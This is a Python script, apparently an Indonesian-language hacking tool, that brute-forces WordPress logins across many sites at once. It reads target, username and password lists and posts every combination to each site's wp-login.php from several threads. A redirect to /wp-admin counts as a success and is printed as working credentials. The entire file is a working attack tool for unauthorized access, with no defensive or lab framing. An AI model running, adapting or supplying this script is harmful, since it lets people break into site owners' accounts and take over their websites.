import requests
from threading import Thread
from queue import Queue

def load_wordlist(path):
    try:
        with open(path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] File tidak ditemukan: {path}")
        return []

def attempt_login(target, username, password):
    login_url = f"{target}/wp-login.php"
    session = requests.Session()

    payload = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': f"{target}/wp-admin/",
        'testcookie': '1'
    }

    try:
        res = session.post(login_url, data=payload, timeout=10, allow_redirects=False)
        if "location" in res.headers and "/wp-admin" in res.headers["location"]:
            print(f"[+] Berhasil login di {target} => {username}:{password}")
            return True
        else:
            print(f"[-] Gagal login di {target} => {username}:{password}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error saat mencoba {target}: {e}")
    return False

def brute_force_mass(user=None, targetlist_path="targets.txt", userlist_path="userlist.txt", passlist_path="passlist.txt", threads=5):
    print("[*] Memulai brute force mass mode")
    
    targets = load_wordlist(targetlist_path)
    usernames = [user] if user else load_wordlist(userlist_path)
    passwords = load_wordlist(passlist_path)

    combo_queue = Queue()

    for target in targets:
        for username in usernames:
            for password in passwords:
                combo_queue.put((target, username, password))

    def worker():
        while not combo_queue.empty():
            target, username, password = combo_queue.get()
            if attempt_login(target, username, password):
                with combo_queue.mutex:
                    combo_queue.queue.clear()
                break
            combo_queue.task_done()

    thread_list = []
    for _ in range(threads):
        t = Thread(target=worker)
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    print("[*] Brute force mass selesai.")
